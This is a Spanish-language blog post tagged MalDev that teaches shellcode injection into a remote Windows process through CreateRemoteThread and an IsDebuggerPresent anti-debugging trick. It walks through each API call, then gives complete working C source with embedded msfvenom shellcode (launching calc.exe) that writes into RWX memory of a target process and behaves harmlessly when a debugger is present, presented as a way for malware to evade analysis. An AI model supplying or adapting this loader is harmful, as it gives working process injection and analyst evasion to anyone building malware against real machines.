---
layout: post
title: Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent
author: c4rta
date: 2023-06-15
tags: [MalDev]
image: /assets/img/remote_thread_injection/waifu.jpg
---

Que onda, esta vez que voy a enseñar a como puedes inyectar una shellcode en un proceso remoto usando CreateRemoteThread, o como tambien se le conoce a la tecnica "Remote Thread Injection", ademas veremos una tecnica AntiDBG muy basica para evadir los depuradores

{:.lead}
## Remote Thread Injection

La tecnica mas basica de inyeccion de procesos, hace uso de ```CreateRemoteThread``` para crear un hilo en el proceso objetivo para que ejecute la shellcode.

Esta tecnica en caso de que se use usando la API estandar de windows (WinAPI o Win32) consta de 4 funciones, ```OpenProcess```, ```VirtualAllocEx```, ```WriteProcessMemory``` y ```CreateRemoteThread```, y al usar la WinAPI, obvio tiene sus desventajas las mas obvia, es que es detectada por la mayoria de AV/EDR, sin embargo, create otro post de como aplicar esta misma tecnica usando la API nativa para poder evadir algunos de ellos.

### ¿Como funciona?

Como primer paso tenemos que se hace uso de la funcion ```OpenProcess``` para abrir el proceso objetivo, donde los parametros que recibe son:

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```

- **dwDesiredAccess**: con que acceso queremos abrir el proceso

- **bInheritHandle**: Un boolean que indica si los procesos creados por el proceso "padre" heredaran el identificador

- **dwProcessId**: El identificador del proceso que se va a abrir

Esta funcion retorna el identificador del proceso que se abrio

<center><img src="/assets/img/remote_thread_injection/1.png" width="400" height="341"></center><br>

---

Como segundo paso, y una vez que tengamos abierto el proceso, necesitamos asignar un buffer de memoria para nuestra shellcode usando ```VirtualAllocEx```, cabe destacar que esta memoria se asigna en el VAS (Virtual Adress Space) los parametros que recibe son:

```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

- **hProcess**: Es el identificador del proceso donde se asignara el buffer de memoria, este identificador es el que regresa la funcion ```OpenProcess```

- **lpAddress**: Es la direccion de memoria desde donde se va a empezar a asignar el buffer de memoria, en caso de que sea ```NULL``` es por que el sistema operativo lo va a hacer

- **dwSize**: Es el tamaño en bytes de la memoria a asignar, regularmente es al tamaño de la shellcode o de lo que se desea inyectar

- **flAllocationType**: Se refiere al tipo de asignacion que queremos, aqui hay muchas opciones, asi que te recomiendo que las veas [aqui](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex#parameters)

- **flProtect**: Es la proteccion que tendra la asignacion de memoria, para nuestro caso usaremos ```PAGE_EXECUTE_READWRITE``` para que tenga permisos de lectura, escritura y ejecucion

Esta funcion retorna la direccion base de donde se asigno el buffer de memoria

<center><img src="/assets/img/remote_thread_injection/2.png" width="400" height="341"></center><br>

---

Como tercer paso, y una vez que se asigno un buffer de memoria para nuestra shellcode, necesitamos escribirla a ese lugar, asi que usamos ```WriteProcessMemory()```, los parametros son:

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

- **hProcess**: Es el identificador del proceso, el cual es el que regresa ```OpenProcess```

- **lpBaseAddress**: La direccion base del buffer de memoria en donde se va a escribir la shellcode, esta direccion es la que retorna ```VirtualAllocEx```

- **lpBuffer**: Un puntero al buffer el cual tiene los datos que se van a copiar, y ese es un puntero a la shellcode

- **nSize**: Tamaño en bytes que se van a copiar, ese tamaño es el tamaño de la shellcode

- **lpNumberOfBytesWritten**: Es una variable que recibe la cantidad de bytes que se van a transferir al proceso objetivo, es opcional y para este caso es innecesario, asi que se deja en NULL

Esta funcion simplemente regresa un valor diferente de 0 si se ejecuto correctamente

<center><img src="/assets/img/remote_thread_injection/3.png" width="400" height="341"></center><br>

---

Como cuarto y ultimo paso, tenemos que crear un hilo en el proceso remoto el cual ejecutara la shellcode, ,los parametros son:

```C
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

- **hProcess**: Es el identificador del proceso de donde se crear el hilo, este identificador es el de ```OpenProcess```

- **lpThreadAttributes**: Son los atributos de seguridad del hilo, para este caso, se dejara en NULL para que la seguridad sea la predeterminada

- **dwStackSize**: Es el tamaño del stack del hilo, en esta caso lo dejaremos NULL para que use el de por defecto

- **lpStartAddress**: Es un puntero que ejecutara el hilo, usaremos por defecto ```LPTHREAD_START_ROUTINE``` para que se ejecute

- **lpParameter**: Es un puntero a una variable, no hace falta asi que lo vamos a dejar en NULL

- **dwCreationFlags**: Son unas flag que controlan la creacion del hilo, mas que nada, le dicen cuando se va a ejecutar, para este caso lo dejaremos en 0 para que el hilo se ejecute el instante de cuando se cree el hilo

- **lpThreadId**: Es el identificador del hilo, para este caso no es necesario

![](/assets/img/remote_thread_injection/4.png)


Resumidamente seria:

Usamos ```OpenProcess``` con los permisos necesarios para abrir el proceso objetivo, despues con ```VirtualAllocEx``` asignamos un buffer de memoria dentro de VAS el cual va hacer usado para la shellcode, despues usamos ```WriteProcessMemory``` para escribir la shellcode en el buffer de memoria asignada anteriormente, y por ultimo usamos ```CreateRemoteThread``` para ejecutar y crear un hilo que desprendera del proceso objetivo 

Y ese seria todo el proceso y funcionamiento de esta tecnica, como te puedes dar cuenta es muy simple pero efectiva cuando se empieza a combinar con muchas mas cosas

## Anti debug (AntiDBG)

Las tecnicas anti debug se usan para evadir los depuradores como OllyDbg, x64dbg, windbg, etc, esto con el fin para que el malware evite ser analizado en un depurador.

La tecnias ma simple que pueda existir es usar la funcion ```IsDebuggerPresent```, lo que hace esta funcion es determinar si una aplicacion esta siendo ejecutada en un depurador o no para que pueda modificar su comportamiento, por detras lo que hace la funcion es checar la flag ```BeingDebugged``` esta activa, esta flag se encuentra en ```Process Environment Block(PEB)```:

```c
typedef struct _PEB{
    UCHAR InheritedAddressSpace;
    UCHAR ReadImageFileExecOptions;
    UCHAR BeingDebugged;
    
    ...
}
```

la sintaxis es:

```c
BOOL IsDebuggerPresent();
```
Y la podemos aplicar de esta forma

```c
if (IsDebuggerPresent()){ 
	//si se encuentra en un depurador podemos realizar otro comportamiento que parezca inofensivo
}else{
    // si no, podemos ejecutar lo que queremos, en este caso, la shellcode
}
```

Una vez sabiendo como funcionan ambas cosas, este es codigo completo en C

```c
#include <stdio.h>
#include <windows.h>

// shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f c

unsigned char shellcode[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
	"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main(){	

		
	if (IsDebuggerPresent()){ 
		MessageBox(NULL, "ESTOY EN UN DEBUGGER >_<", "HOLA", MB_OK); //si detecta que esta en un debugger muestra una ventana con un mensaje
	}else{ 
		
		HANDLE hProcess = OpenProcess(
			PROCESS_ALL_ACCESS, 
			TRUE,
			8664 //PID del proceso
		);
		
		void* exec_mem = VirtualAllocEx(
			hProcess,
			NULL, 
			sizeof(shellcode), 
			MEM_COMMIT | MEM_RESERVE, 
			PAGE_EXECUTE_READWRITE 
		);
		
		WriteProcessMemory(
			hProcess, 
			exec_mem, 
			shellcode, 
			sizeof(shellcode), 
			NULL 
		);
		
		HANDLE hTread = CreateRemoteThread(
			hProcess, 
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)exec_mem, 
			NULL, 
			0, 
			0 
		);
		
		CloseHandle(hProcess);
	}
		
	return 0;
}

```

Cuando lo ejecutamos, podemos ver como se desprende un hilo del proceso donde se inyecto la shellcode, en este caso fue paint

![](/assets/img/remote_thread_injection/5.png)

Y si lo corremos en un debugger, muestra la ventanita de que esta en un debugger

![](/assets/img/remote_thread_injection/6.png)

Eso ha sido todo, gracias por leer ❤
